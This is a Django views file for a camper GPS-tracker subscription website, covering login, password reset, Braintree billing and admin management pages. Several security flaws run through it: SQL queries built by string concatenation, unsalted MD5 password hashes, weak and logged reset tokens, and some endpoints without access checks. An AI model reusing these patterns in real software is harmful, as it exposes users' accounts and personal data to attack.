    if request.method == 'POST':
        token = generateRecoveryToken()
        message="Recevory Password Token: " + token
        aspuser = Aspnetusers.objects.get(email=request.POST["email"])
        aspuser.securitystamp = token
        aspuser.save()
        to_emails = []
        to_emails.append(request.POST['email'])
        print(to_emails, settings.EMAIL_HOST_USER)
        try:
            send_mail("Reset Password", message, settings.EMAIL_HOST_USER, to_emails)
        except BadHeaderError:
            return render(request,"forgotpassword.html",{"header_content":header_content[0],"category_list":category_list,"error":'exist'})
        return render(request,"forgotpassword.html",{"header_content":header_content[0],"category_list":category_list,"error":"no","email":request.POST['email']})
    return render(request,"forgotpassword.html",{"header_content":header_content[0],"category_list":category_list})
def login(request):
    if "user_id" in request.session:
        if request.session['user_role'] == "Admin":
            return redirect('/Admin')
        else:
            return redirect('/')
    if request.method == 'POST':
        try:
            aspuser = Aspnetusers.objects.get(email=request.POST["Username"])
            if check_password(aspuser.passwordhash, request.POST['Password']):
                request.session['user_id'] = aspuser.id
                request.session['login_status'] = True
                try:
                    user_role = get_list_from_sql("select RoleId as roleid from aspnetuserroles where UserId = '"+aspuser.id+"'")
                    role = Aspnetroles.objects.get(id=user_role[0]['roleid'])
                    request.session['user_role'] = role.name
                except:
                    request.session['user_role'] = "client"
                if request.session['user_role'] == "Admin":
                    return redirect('/Admin')
                else:
                    return redirect('/')
        except:
            return redirect('/Login')
    header_content = TblHeadercontent.objects.all()
    category_list = Trackercategory.objects.all()
    return render(request,"login.html",{"header_content":header_content[0],"category_list":category_list})
def upgradeSubscription(request):
    package_id = request.POST['package_id']
    package_item = Packagelist.objects.get(id=package_id)
    package_price = package_item.pricemonthly
    if settings.BRAINTREE_PRODUCTION:
        braintree_env = braintree.Environment.Production
    else:
        braintree_env = braintree.Environment.Sandbox
    gateway = braintree.BraintreeGateway(
        braintree.Configuration(
            braintree_env,
            merchant_id=settings.BRAINTREE_MERCHANT_ID,
            public_key=settings.BRAINTREE_PUBLIC_KEY,
            private_key=settings.BRAINTREE_PRIVATE_KEY,
        )
    )
    user_id = Users.objects.get(userid=request.session["user_id"]).id
    _subscription_item = Subscriptionuserwisepayment.objects.filter(usersubscriptionid=user_id).order_by('-id')[0]
    result = gateway.subscription.cancel(_subscription_item.braintree_subscriptionid)
    
    result = gateway.subscription.create({
        "payment_method_token": _subscription_item.braintree_token,
        "plan_id": package_item.month_planid 
    })
    print(result.subscription.price)
    if result.is_success:
        subscription_item = Subscriptionuserwisepayment()
        subscription_item.usersubscriptionid = user_id
        subscription_item.braintree_subscriptionid = result.subscription.id
        subscription_item.braintree_token = _subscription_item.braintree_token
        subscription_item.paymentdate = datetime.datetime.now()
        subscription_item.paymentammount = result.subscription.price
        subscription_item.subscriptionpcakage = package_id
        subscription_item.paymentinterval = '1'
        subscription_item.save()
        package_item.pricemonthly = result.subscription.price
        package_item.save()
        return JsonResponse({'result':'success'})
    else:
        return JsonResponse({'result':'false'})
def getAmount(request):
    tracker = Trackerlisitem.objects.get(id=request.POST['Tracker_Type'])
    tracker_price = round(tracker.dicountprice,2) #+ tracker.taxprice
    tracker_tax_price = round(float(tracker_price) * 19 / 119, 2)
    tracker_price = float("{:.2f}".format(float(tracker_price) - tracker_tax_price))
    package_item = Packagelist.objects.get(id=request.POST['Subscriptiontype'])
    activate_price = float("{:.2f}".format(package_item.activationfeeoncepervehicle))
    activate_tax_price = round(float(activate_price) * 19 / 119, 2)
    activate_price = float("{:.2f}".format(activate_price - activate_tax_price))
    package_description = package_item.packagename
    if request.POST['Payment_Interval']=='1':
        package_price = package_item.pricemonthly
        package_description += " 1 month"
    elif request.POST['Payment_Interval']=='2':
        package_price = package_item.pricequarter
        package_description += " 3 months"
    elif request.POST['Payment_Interval']=='3':
        package_price = package_item.pricehalf
        package_description += " 6 months"
    elif request.POST['Payment_Interval']=='4':
        package_price = package_item.priceoneyear
        package_description += " 1 year"
    else:
        package_price = package_item.pricetwoyear
        package_description += " 2 years"
    s_tax_price = round(float(package_price) * 19 / 119, 2)
    s_plan_price = round(float(package_price) - s_tax_price, 2)
    total_price = round(float(tracker_price) + tracker_tax_price + activate_price + s_plan_price + s_tax_price + activate_tax_price,2)
    total_tax_price = float(s_tax_price + activate_tax_price + tracker_tax_price)
    return JsonResponse({'t_name':tracker.trackername,'t_price':tracker_price,'t_tax_price':"{:.2f}".format(total_tax_price),'t_activate_price':activate_price,'s_price':s_plan_price,'s_name':package_description,'total_price':"{:.2f}".format(total_price)})
def getVehicleAmount(request):
    tracker = Trackerlisitem.objects.get(id=request.POST['tracker_id'])
    tracker_price = round(tracker.dicountprice,2) #+ tracker.taxprice
    tracker_tax_price = round(float(tracker_price) * 19 / 119, 2)
    tracker_price = float("{:.2f}".format(float(tracker_price) - tracker_tax_price))
    package_item = Packagelist.objects.get(id=request.POST['package_id'])
    # if request.POST['activate_payment_interval']=='1':
    #     activate_price = package_item.activatepricemonthly
    #     activate_description = " 1 month"
    # elif request.POST['activate_payment_interval']=='2':
    #     activate_price = package_item.activatepricequarter
    #     activate_description = " 3 months"
    # elif request.POST['activate_payment_interval']=='3':
    #     activate_price = package_item.activatepricehalf
    #     activate_description = " 6 months"
    # elif request.POST['activate_payment_interval']=='4':
    #     activate_price = package_item.activatepriceyear
    #     activate_description = " 1 year"
    activate_price = float("{:.2f}".format(package_item.activationfeeoncepervehicle))
    activate_tax_price = round(float(activate_price) * 19 / 119, 2)
    activate_price = float("{:.2f}".format(float(activate_price) - activate_tax_price))
    package_description = package_item.packagename
    if request.POST['payment_interval']=='1':
        package_price = package_item.activatepricemonthly
        package_description += " 1 Monat"
    elif request.POST['payment_interval']=='2':
        package_price = package_item.activatepricequarter
        package_description += " 3 Monate"
    elif request.POST['payment_interval']=='3':
        package_price = package_item.activatepricehalf
        package_description += " 6 Monate"
    elif request.POST['payment_interval']=='4':
        package_price = package_item.activatepriceyear
        package_description += " 1 Jahr"
    else:
        package_price = package_item.pricetwoyear
        package_description += " 2 Jahre"
    if package_price is None:
        package_price = 0
    s_tax_price = round(float(package_price) * 19 / 119, 2)
    s_plan_price = round(float(package_price) - s_tax_price, 2)
    total_price = round(float(tracker_price) + tracker_tax_price + activate_price + s_plan_price + s_tax_price + activate_tax_price,2)
    total_tax_price = float(s_tax_price + activate_tax_price + tracker_tax_price)
    return JsonResponse({'t_name':tracker.trackername,'t_price':tracker_price,'t_tax_price':"{:.2f}".format(total_tax_price),'t_activate_price':activate_price,'s_price':s_plan_price,'s_name':package_description,'total_price':"{:.2f}".format(total_price)})
def subscription(request):
    if settings.BRAINTREE_PRODUCTION:
        braintree_env = braintree.Environment.Production
    else:
        braintree_env = braintree.Environment.Sandbox
    # Configure Braintree
    config = braintree.Configuration.configure(
        braintree_env,
        merchant_id=settings.BRAINTREE_MERCHANT_ID,
        public_key=settings.BRAINTREE_PUBLIC_KEY,
        private_key=settings.BRAINTREE_PRIVATE_KEY,
    )
    if request.method == 'POST':
        print(request.POST)
        nonce_from_the_client = request.POST['payment_method_nonce']
        if nonce_from_the_client != "":
            tracker = Trackerlisitem.objects.get(id=request.POST['Tracker_Type'])
            tracker_price = float(tracker.dicountprice) #+ tracker.taxprice
            # tracker_price = round(float(tracker_price) * (1 + float(tracker.taxprice / 100)), 1)
            package_item = Packagelist.objects.get(id=request.POST['Subscriptiontype'])
            tracker_price += float(package_item.activationfeeoncepervehicle)
            package_description = "Subscription - " + package_item.packagename
            if request.POST['Payment_Interval']=='1':
                package_price = package_item.pricemonthly
                package_planid = package_item.month_planid
                package_description += " 1 month"
            elif request.POST['Payment_Interval']=='2':
                package_price = package_item.pricequarter
                package_planid = package_item.number_3months_planid
                package_description += " 3 months"
            elif request.POST['Payment_Interval']=='3':
                package_price = package_item.pricehalf
                package_planid = package_item.number_6months_planid
                package_description += " 6 months"
            elif request.POST['Payment_Interval']=='4':
                package_price = package_item.priceoneyear
                package_planid = package_item.year_planid
                package_description += " 1 year"
            else:
                package_price = package_item.pricetwoyear
                package_planid = package_item.number_2years_planid
                package_description += " 2 years"
            tracker_price = round(tracker_price,2)
            print(tracker_price)
            gateway = braintree.BraintreeGateway(
                braintree.Configuration(
                    braintree_env,
                    merchant_id=settings.BRAINTREE_MERCHANT_ID,
                    public_key=settings.BRAINTREE_PUBLIC_KEY,
                    private_key=settings.BRAINTREE_PRIVATE_KEY,
                )
            )
            result = gateway.customer.create({
                "first_name": request.POST['Firstname'],
                "last_name": request.POST['Surname'],
                "email": request.POST['RegEmail']
            })
            customer_id = result.customer.id
            new_nonce = gateway.payment_method.create({
                "customer_id": customer_id,
                "payment_method_nonce": nonce_from_the_client,
            })
            if new_nonce.is_success:
                
                print(new_nonce.payment_method.token)
                result1 = braintree.Transaction.sale({
                    "amount": str(tracker_price),
                    "payment_method_token": new_nonce.payment_method.token,
                    "options": {
                        "submit_for_settlement": True
                    },
                    "custom_fields": {
                        "description": tracker.trackername
                    }
                })
                # print(result1, result1.is_success, result1.transaction)
                result2 = gateway.subscription.create({
                    "payment_method_token": new_nonce.payment_method.token,
                    "plan_id": package_planid 
                })
                # result2 = braintree.Transaction.sale({
                #     "amount": str(package_price),
                #     "payment_method_token": new_nonce.payment_method.token,
                #     "options": {
                #         "submit_for_settlement": True
                #     },
                #     "custom_fields": {
                #         "description": package_description
                #     }
                # })
                print(result2.subscription.id)
                users = Users.objects.filter(email=request.POST['RegEmail'])
                if len(users) <= 0 and result1.is_success and result2.is_success:
                    new_user = Users(salutation=int(request.POST['salutation']),company=request.POST['company'],firstname=request.POST['Firstname'],lastname=request.POST['Surname'],email=request.POST['RegEmail'],phoneno=request.POST['RegPhoneno'],dob=request.POST['Datebirth'],address_city=request.POST['City'],address_country=request.POST['Country'],address_housenumber=request.POST['housenumber'],address_street=request.POST['Road'],address_postal=request.POST['Postalcode'],createdon=datetime.datetime.now(),vatnumber=request.POST['VATnumber'])
                    new_user.save()
                    last_id = Users.objects.latest('id').id
                    user_id = generateUserId(last_id)
                    last_user = Users.objects.get(id=last_id)
                    last_user.userid = user_id
                    last_user.save()
                    new_aspuser = Aspnetusers(id=user_id,email=request.POST['RegEmail'],passwordhash=make_password(request.POST['Password']),phonenumber=request.POST['RegPhoneno'])
                    new_aspuser.save()
                    subscription_item = Subscriptionuserwisepayment()
                    subscription_item.usersubscriptionid = last_id
                    subscription_item.braintree_subscriptionid = result2.subscription.id
                    subscription_item.braintree_token = new_nonce.payment_method.token
                    subscription_item.paymentdate = datetime.datetime.now()
                    subscription_item.paymentammount = package_price
                    subscription_item.subscriptionpcakage = request.POST['Subscriptiontype']
                    subscription_item.paymentinterval = request.POST['Payment_Interval']
                    subscription_item.save()
                    order_item = Trackerorders()
                    order_item.orderdate = datetime.datetime.now()
                    order_item.userid = user_id
                    order_item.subtotal = tracker_price
                    order_item.paymenttype = result1.transaction.payment_instrument_type
                    order_item.save()
                    order_id = Trackerorders.objects.latest('orderid').orderid
                    _orderitem = Trackerorderitems()
                    _orderitem.qty = 1
                    _orderitem.trackerid = request.POST['Tracker_Type']
                    _orderitem.orderid = order_id
                    _orderitem.save()
                    result = Billingaddressmaster()
                    result.userid = user_id
                    result.salutation = request.POST['salutation']
                    result.firstname = request.POST['Firstname']
                    result.lastname = request.POST['Surname']
                    result.email = request.POST['RegEmail']
                    result.phoneno = request.POST['RegPhoneno']
                    result.road = request.POST['Road']
                    result.country = request.POST['Country']
                    result.postcode = request.POST['Postalcode']
                    result.housenumber = request.POST['housenumber']
                    result.state = request.POST['City']
                    result.company = request.POST['company']
                    result.vatnumber = request.POST['VATnumber']
                    result.latitude = 0.0
                    result.longitude = 0.0
                    result.save()
                    s_result = Shippingaddressmaster()
                    s_result.userid = user_id
                    s_result.salutation = request.POST['salutation']
                    s_result.firstname = request.POST['Firstname']
                    s_result.lastname = request.POST['Surname']
                    s_result.email = request.POST['RegEmail']
                    s_result.phoneno = request.POST['RegPhoneno']
                    s_result.company = request.POST['company']
                    if request.POST['is_like'] == True:
                        s_result.road = request.POST['Road']
                        s_result.country = request.POST['Country']
                        s_result.postcode = request.POST['Postalcode']
                        s_result.housenumber = request.POST['housenumber']
                        s_result.state = request.POST['City']
                        s_result.vatnumber = request.POST['VATnumber']
                        s_result.is_like = True
                    else:
                        s_result.road = request.POST['Shipping_Road']
                        s_result.country = request.POST['Shipping_Country']
                        s_result.postcode = request.POST['Shipping_Postalcode']
                        s_result.housenumber = request.POST['Shipping_housenumber']
                        s_result.state = request.POST['Shipping_City']
                        s_result.vatnumber = request.POST['Shipping_VATnumber']
                        s_result.is_like = False
                    s_result.latitude = 0.0
                    s_result.longitude = 0.0
                    s_result.save()
        return redirect('/Login')
    header_content = TblHeadercontent.objects.all()
    packagelist = Packagelist.objects.all().filter(isactive=1).order_by('sortorder')
    tracker_list = Trackerlisitem.objects.filter(trackercategory=1)
    image_list = Trackeritemimages.objects.all()
    category_list = Trackercategory.objects.all()
    
    if "user_id" in request.session:
        braintree_client_token = braintree.ClientToken.generate({ "customer_id": request.session['user_id'] })
    else:
        braintree_client_token = braintree.ClientToken.generate({})
    return render(request,"subscription.html",{"header_content":header_content[0],"packagelist":packagelist,"tracker_list":tracker_list,"image_list":image_list,"braintree_client_token":braintree_client_token,"category_list":category_list})
def contactus(request):
    header_content = TblHeadercontent.objects.all()
    category_list = Trackercategory.objects.all()
    return render(request,"contactUs.html",{"header_content":header_content[0],"category_list":category_list})
def conditions(request):
    header_content = TblHeadercontent.objects.all()
    category_list = Trackercategory.objects.all()
    return render(request,"conditions.html",{"header_content":header_content[0],"category_list":category_list})
def privacypolicy(request):
    header_content = TblHeadercontent.objects.all()
    category_list = Trackercategory.objects.all()
    return render(request,"privacypolicy.html",{"header_content":header_content[0],"category_list":category_list})
def imprint(request):
    header_content = TblHeadercontent.objects.all()
    category_list = Trackercategory.objects.all()
    return render(request,"imprint.html",{"header_content":header_content[0],"category_list":category_list})
def admin_login(request):

    if "user_id" in request.session and "user_role" in request.session and request.session['user_role']=="Admin":
        return redirect('/Admin')
    if request.method == 'POST':
        try:
            aspuser = Aspnetusers.objects.get(email=request.POST["email"])
            if check_password(aspuser.passwordhash, request.POST['password']):
                user_role = get_list_from_sql("select RoleId as roleid from aspnetuserroles where UserId = '"+aspuser.id+"'")
                role = Aspnetroles.objects.get(id=user_role[0]['roleid'])
                if role.name == "Admin":
                    
                    request.session['user_id'] = aspuser.id
                    request.session['user_role'] = role.name
                    request.session['login_status'] = True
                    print(request.session['user_id'])
                    return redirect('/Admin')
        except:
            return redirect('/Admin/Login')
    return render(request,"admin/login.html",{"url":'login'})
def logout(request):
    try:
        user_role = request.session['user_role']
        del request.session['user_id']
        del request.session['user_role']
        del request.session['login_status']
        del request.session['cart_list']
    except KeyError:
        user_role = ""
        pass
    if user_role == "Admin":
        return redirect('/Admin')
    else:
        return redirect('/')
def admin(request):
    if "user_id" not in request.session or "user_role" not in request.session or request.session['user_role']!="Admin":
        return redirect('/Admin/Login')
    users = get_list_from_sql("select count(*) as count from users inner join aspnetusers on users.UserID = aspnetusers.Id")
    vehicle_count = Vehicleset.objects.count()
    campingsite_count = Campingplaces.objects.count()
    return render(request,"admin/home.html",{ "user_count": users[0]['count'], "vehicle_count": vehicle_count, "campingsite_count": campingsite_count, "url":"admin"})
def messagebox(request):
    if "user_id" not in request.session or "user_role" not in request.session or request.session['user_role']!="Admin":
        return redirect('/Admin/Login')
    message_list = Mailbox.objects.all().order_by('-id')
    return render(request,"admin/messagebox.html",{"message_list":message_list})
def messageReply(request):
    to_emails = []
    to_emails.append(request.POST['email'])
    send_mail("Trackyourcamper", request.POST['content'], settings.EMAIL_HOST_USER, to_emails)
    return redirect('/Messagebox')
def messageDelete(request, id):
    message = Mailbox.objects.get(id=id)
    message.delete()
    return JsonResponse({'result':'success'})
def message(request, id):
    if "user_id" not in request.session or "user_role" not in request.session or request.session['user_role']!="Admin":
        return redirect('/Admin/Login')
    message = Mailbox.objects.get(id=id)
    message.flag = 1
    message.save()
    return render(request,"admin/message.html",{"message":message})
def manageOrders(request):
    if "user_id" not in request.session or request.session['user_role']!="Admin":
        return redirect('/Admin/Login')
    order_list = get_list_from_sql("select users.Firstname as firstname, users.Lastname as lastname, users.Email as email, users.userid, trackerlisitem.*, trackerorderitems.*, trackerorders.OrderId, trackerorders.OrderDate, trackerorders.Subtotal, shippingaddressmaster.* from trackerorders left join trackerorderitems on trackerorderitems.OrderID = trackerorders.OrderId left join trackerlisitem on trackerorderitems.TrackerId = trackerlisitem.Id left join users on users.userid = trackerorders.UserId left join shippingaddressmaster on shippingaddressmaster.UserID = trackerorders.UserId") 
    return render(request,"admin/tracker_orders.html",{"url":"manageOrders","order_list":order_list})
def manageTrackerAlarm(request):
    if "user_id" not in request.session or request.session['user_role']!="Admin":
        return redirect('/Admin/Login')
    alarm_list = get_list_from_sql("select trackeralarms.Location_Date, trackeralarms.Location_time, trackeralarms.Command, trackeralarms.Response, trackeralarms.CommandStatus, new.LicensePlate, new.Firstname, new.Lastname from trackeralarms inner join (select vehicleset.LicensePlate, users.Firstname, users.Lastname, vehicleset.TrackerId from vehicleset left join users on users.ID = vehicleset.UserId) as new on trackeralarms.TrackerID = new.TrackerID order by trackeralarms.ID desc")
    return render(request,"admin/manageTrackerAlarm.html",{"alarm_list":alarm_list, "url":"manageTrackerAlarm"})
def manageVehicles(request):
    if "user_id" not in request.session or request.session['user_role']!="Admin":
        return redirect('/Admin/Login')
    vehicle_list = get_list_from_sql("select vehicletypemaster.VehicleType, brandset.Name, vehicleset.ModelTypeName, vehicleset.Color, users.Firstname, users.Lastname, vehicleset.LicensePlate, vehicleset.BuildingYear, vehicleset.id, vehicleset.Istrackerconfiguration, vehicleset.Isgeofanceactive, vehicleset.Isoverspeedactive, vehicleset.Islowbatteryactive, vehicleset.Ispoweroffactive from vehicleset left join vehicletypemaster on vehicleset.VehicleType = vehicletypemaster.Id left join brandset on brandset.Id = vehicleset.BrandId left join users on users.ID = vehicleset.UserId")
    return render(request,"admin/manageVehicles.html", {"vehicle_list":vehicle_list, "url":"manageVehicles"})
def manageVehicleEdit(request, id):
    if "user_id" not in request.session or request.session['user_role']!="Admin":
        return redirect('/Admin/Login')
    if request.method == 'POST':
        instance = Vehicleset.objects.get(id=id)
        form = VehicleForm(request.POST, instance=instance)
        if form.is_valid():
            form.save()
            saveModelId(request.POST['modeltypename'], request.POST['brandid'])
            return redirect('/Admin/ManageVehicles')
        else:
            print(form.errors)
        
    vehicle_info = Vehicleset.objects.get(id=id)
    vehicle_type_list = Vehicletypemaster.objects.all()
    user_list = Users.objects.all()
    brand_list = Brandset.objects.all()
    return render(request,"admin/manageVehicleCreate.html",{"vehicle_info":vehicle_info,"type_list":vehicle_type_list,"user_list":user_list,"brand_list":brand_list, "url":"manageVehicles"})
def manageVehicleDelete(request, id):
    if "user_id" not in request.session or request.session['user_role']!="Admin":
        return redirect('/Admin/Login')
    vehicle_info = Vehicleset.objects.get(id=id)
    vehicle_info.delete()
    return JsonResponse({'result':'success'})
def manageVehicleImageUpload(request, id):
    if "user_id" not in request.session or request.session['user_role']!="Admin":
        return redirect('/Admin/Login')
    if request.method == 'POST' and request.FILES['image']:
        myfile = request.FILES['image']
        limit = 5 * 1024 * 1024
        if myfile.size > limit:
            return JsonResponse({'result':'fail','message':'Datei zu groß. Die Größe sollte 5 MiB nicht überschreiten.'})
        fs = FileSystemStorage()
        old_name, extension = os.path.splitext(myfile.name)
        new_name = datetime.datetime.now().strftime("%Y%m%d%H%M%S") + extension
        filename = fs.save("static_in_env/upload/"+new_name, myfile)
        new_image = Vehicleimages(image=new_name)
        new_image.save()
        if id != 0:
            vehicle_info = Vehicleset.objects.get(id=id)
            vehicle_info.imageid = Vehicleimages.objects.latest('id').id
            vehicle_info.save()
            return JsonResponse({'result':'success','image_name':new_name})
        else:
            return JsonResponse({'result':'success','image_id':Vehicleimages.objects.latest('id').id})
    return JsonResponse({'result':'fail','message':'Datei ist nicht vorhanden.'})
def manageVehicleDetail(request, id):
    if "user_id" not in request.session or request.session['user_role']!="Admin":
        return redirect('/Admin/Login')
    vehicle_info = get_list_from_sql("select vehicletypemaster.VehicleType as type_name, brandset.Name, vehicleset.*, users.Firstname, users.Lastname, vehicleimages.Image as img_name from vehicleset left join vehicletypemaster on vehicleset.VehicleType = vehicletypemaster.Id left join brandset on brandset.Id = vehicleset.BrandId left join users on users.ID = vehicleset.UserId left join vehicleimages on vehicleset.ImageId = vehicleimages.Id where vehicleset.id = " + str(id))
    # print(vehicle_info[0])
    return render(request,"admin/manageVehicleDetail.html", {"vehicle_info":vehicle_info[0], "vehicle_id":id, "url":"manageVehicles"})
def saveModelId(model, brandId):
    model_info = Brandmodeltypeset.objects.filter(brandid=brandId, name=model)
    if not model_info:
        new_model = Brandmodeltypeset(brandid=brandId, name=model)
        new_model.save()
def manageVehicleCreate(request):
    if "user_id" not in request.session or request.session['user_role']!="Admin":
        return redirect('/Admin/Login')
    if request.method == 'POST':
        form = VehicleForm(request.POST)
        if form.is_valid():
            form.save()
            saveModelId(request.POST['modeltypename'], request.POST['brandid'])
            return redirect('/Admin/ManageVehicles')
    vehicle_type_list = Vehicletypemaster.objects.all()
    user_list = Users.objects.all()
    brand_list = Brandset.objects.all()
    return render(request,"admin/manageVehicleCreate.html",{"type_list":vehicle_type_list,"user_list":user_list,"brand_list":brand_list, "url":"manageVehicles"})
def manageTrackerLocationHistory(request):
    if "user_id" not in request.session or request.session['user_role']!="Admin":
        return redirect('/Admin/Login')
    return render(request,"admin/manageTrackerLocationHistory.html", {"url":"manageTrackerLocationHistory"})
def manageBrands(request):
    if "user_id" not in request.session or request.session['user_role']!="Admin":
        return redirect('/Admin/Login')
    brand_list = get_list_from_sql("select brandset.Name, brandset.Id, brand_model.count as Count from brandset left join (select count(BrandId) as count, BrandId from brandmodeltypeset group by BrandId) as brand_model on brand_model.BrandId = brandset.Id")
    return render(request,"admin/manageBrands.html",{"brand_list":brand_list, "url":"manageBrands"})
def getModelList(request, id):
    if "user_id" not in request.session or request.session['user_role']!="Admin":
        return redirect('/Admin/Login')
    model_list = Brandmodeltypeset.objects.filter(brandid=id).values()
    return JsonResponse({"result":list(model_list)})
def manageBrandDetail(request, id):
    if "user_id" not in request.session or request.session['user_role']!="Admin":
        return redirect('/Admin/Login')
    brand_info = Brandset.objects.get(id=id)
    model_list = get_list_from_sql("select * from brandmodeltypeset where BrandId =" + str(id))
    return render(request,"admin/manageBrandDetail.html",{"brand_info":brand_info,"model_list":model_list, "brand_id":id, "url":"manageBrands"})
def manageBrandEdit(request, id):
    if "user_id" not in request.session or request.session['user_role']!="Admin":
        return redirect('/Admin/Login')
    if request.method == 'POST':
        instance = Brandset.objects.get(id=id)
        form = BrandForm(request.POST, instance=instance)
        if form.is_valid():
            form.save()
            return redirect('/Admin/ManageBrands')
    brand_info = Brandset.objects.get(id=id)
    return render(request,"admin/manageBrandCreate.html",{"brand_info":brand_info, "url":"manageBrands"})
def manageBrandDelete(request, id):
    if "user_id" not in request.session or request.session['user_role']!="Admin":
        return redirect('/Admin/Login')
    brand = Brandset.objects.get(id=id)
    brand.delete()
    return JsonResponse({'result':'success'})
def modelDelete(request, id):
    if "user_id" not in request.session or request.session['user_role']!="Admin":
        return redirect('/Admin/Login')
    model = Brandmodeltypeset.objects.get(id=id)
    model.delete()
    return JsonResponse({'result':'success'})
def manageBrandCreate(request):
    if "user_id" not in request.session or request.session['user_role']!="Admin":
        return redirect('/Admin/Login')
    if request.method == 'POST':
        form = BrandForm(request.POST)
        print(request.POST)
        if form.is_valid():
            form.save()
            return redirect('/Admin/ManageBrands')
        else:
            print(forms.errors())
    return render(request,"admin/manageBrandCreate.html",{"url":"manageBrands"})
def manageCampingPlace(request):
    if "user_id" not in request.session or request.session['user_role']!="Admin":
        return redirect('/Admin/Login')
    campingPlace_list = get_list_from_sql("select campingplaces.ID, campingplaces.Name, campingplaces.address_city, campingplaces.address_road, campingplaces.address_degreeoflatitude, campingplaces.address_degreeoflongitude, users.Firstname, users.Lastname from campingplaces left join users on users.id = campingplaces.QwnerId order by campingplaces.ID")
    return render(request,"admin/manageCampingPlace.html",{"campingplace_list":campingPlace_list, "url":"manageCampingPlace"})
def manageCampingPlaceDelete(request, id):
    if "user_id" not in request.session or request.session['user_role']!="Admin":
        return redirect('/Admin/Login')
    campingplace = Campingplaces.objects.get(id=id)
    campingplace.delete()
    return JsonResponse({'result':'success'})
def manageCampingPlaceDetail(request, id):
    if "user_id" not in request.session or request.session['user_role']!="Admin":
        return redirect('/Admin/Login')
    campingplace_info = Campingplaces.objects.get(id=id)
    print(campingplace_info.qwnerid)
    user_info = Users.objects.get(id=campingplace_info.qwnerid)
    return render(request,"admin/manageCampingPlaceDetail.html",{"campingplace_info":campingplace_info,"user_info":user_info, "url":"manageCampingPlace"})
def manageCampingPlaceEdit(request, id):
    if "user_id" not in request.session or request.session['user_role']!="Admin":
        return redirect('/Admin/Login')
    if request.method == 'POST':
        instance = Campingplaces.objects.get(id=id)
        form = CampingplaceForm(request.POST, instance=instance)
        if form.is_valid():
            form.save()
            return redirect('/Admin/ManageCampingPlace')
        else:
            print(form.errors)
    camping_status = CamperRegulationansmaster.objects.all()
    user_list = Users.objects.all()
    campingplace_info = Campingplaces.objects.get(id=id)
    return render(request,"admin/manageCampingPlaceCreate.html",{"campingplace_info":campingplace_info,"camping_status":camping_status,'user_list':user_list,"url":"manageCampingPlace"})
def manageCampingPlaceCreate(request):
    if "user_id" not in request.session or request.session['user_role']!="Admin":
        return redirect('/Admin/Login')
    if request.method == 'POST':
        form = CampingplaceForm(request.POST)
        if form.is_valid():
            form.save()
            return redirect('/Admin/ManageCampingPlace')
    camping_status = CamperRegulationansmaster.objects.all()
    user_list = Users.objects.all()
    return render(request,"admin/manageCampingPlaceCreate.html", {"camping_status":camping_status,'user_list':user_list,"url":"manageCampingPlace"})

def manageuser(request):
    if "user_id" not in request.session or request.session['user_role']!="Admin":
        return redirect('/Admin/Login')
    users = get_list_from_sql("select users.UserID as id, users.Firstname as firstname, users.Lastname as lastname, users.Email as email, campingplaces.Name as campingsite_name, GROUP_CONCAT(aspnetroles.Name) as role_name, users.DOB as birthday, aspnetusers.LockoutEnabled as lock_status, aspnetuserroles.RoleId as role_id from users inner join aspnetusers on users.UserID = aspnetusers.Id left join aspnetuserroles on aspnetuserroles.UserId = users.UserID left join aspnetroles on aspnetuserroles.RoleId like CONCAT('%', CONCAT(aspnetroles.Id, '%')) left join campingplaces on users.ResponsibleForCampingPlaceId = campingplaces.ID group by id, firstname, lastname, email, campingsite_name, birthday, lock_status, role_id, users.ID order by users.ID desc")
    admin_users = get_list_from_sql("select count(*) as count from users inner join aspnetusers on users.UserID = aspnetusers.Id left join aspnetuserroles on aspnetuserroles.UserId = users.UserID left join aspnetroles on aspnetuserroles.RoleId like CONCAT('%', CONCAT(aspnetroles.Id, '%')) where aspnetroles.Name like 'Admin'")
    role_list = Aspnetroles.objects.all()
    return render(request,"admin/manageUser.html",{"users":users, "admin_users":admin_users[0]['count'], "role_list":role_list,"url":"manageUser"})
def generateRecoveryToken():
    ran = ''.join(random.choices(string.ascii_lowercase + string.digits, k = 8))  
    print(str(ran))
    return str(ran)
def generateUserId(id):
    customer_id = "T-"
    for i in range(8-len(str(id))):
        customer_id += "0"
    customer_id += str(id)
    # ran = ''.join(random.choices(string.ascii_lowercase + string.digits, k = 8))  
    # ran += "-" + ''.join(random.choices(string.ascii_lowercase + string.digits, k = 4))
    # ran += "-" + ''.join(random.choices(string.ascii_lowercase + string.digits, k = 4))
    # ran += "-" + ''.join(random.choices(string.ascii_lowercase + string.digits, k = 4))
    # ran += "-" + ''.join(random.choices(string.ascii_lowercase + string.digits, k = 12))
    # print(str(ran))
    return customer_id

def make_password(password):
    assert password
    hash = hashlib.md5(password.encode('utf8')).hexdigest()
    return hash
def getCoordinate(request, street):
    print(street)
    loc = gmaps.geocode(street.replace("+"," "))
    print(loc)
    if len(loc) > 0:
        coordinate = loc[0]['geometry']['location'] 
        return JsonResponse({"result":"success",'lat':coordinate['lat'],"lng":coordinate['lng']})
    else:
        return JsonResponse({"result":"fail"})
def check_password(hash, password):
    generated_hash = make_password(password)
    return hash == generated_hash
def manageUserDelete(request, id):
    if "user_id" not in request.session or request.session['user_role']!="Admin":
        return redirect('/Admin/Login')
    aspuser = Aspnetusers.objects.get(id=id)
    aspuser.delete()
    user = Users.objects.get(userid=id)
    user.delete()
    execute_sql("Delete from aspnetuserroles where UserId like '" + id + "'")
    return JsonResponse({'result':'success'})
def manageUserDetail(request, id):
    if "user_id" not in request.session or request.session['user_role']!="Admin":
        return redirect('/Admin/Login')
    user_info = get_list_from_sql("select users.ID as id, users.Firstname as firstname, users.Lastname as lastname, users.Email as email, users.Phoneno as phone, users.Address_City as city, users.Address_Country as country, users.Address_State as state, users.Address_Street as street, users.Address_Postal as postal, users.Address_Latitude as lat, users.Address_Longitude as lon, campingplaces.Name as campingsite_name, GROUP_CONCAT(aspnetroles.Name) as role_name, users.DOB as birthday, aspnetusers.LockoutEnabled as lock_status, aspnetuserroles.RoleId as role_id, salutationmaster.salutation as salutation from users inner join aspnetusers on users.UserID = aspnetusers.Id left join aspnetuserroles on aspnetuserroles.UserId = users.UserID left join aspnetroles on aspnetuserroles.RoleId like CONCAT('%', CONCAT(aspnetroles.Id, '%')) left join campingplaces on users.ResponsibleForCampingPlaceId = campingplaces.ID left join salutationmaster on salutationmaster.ID = users.salutation where users.UserID like '"+ id +"' group by id, firstname, lastname, email, phone, city, country, state, street, postal, lat, lon, campingsite_name, birthday, lock_status, role_id, salutation")
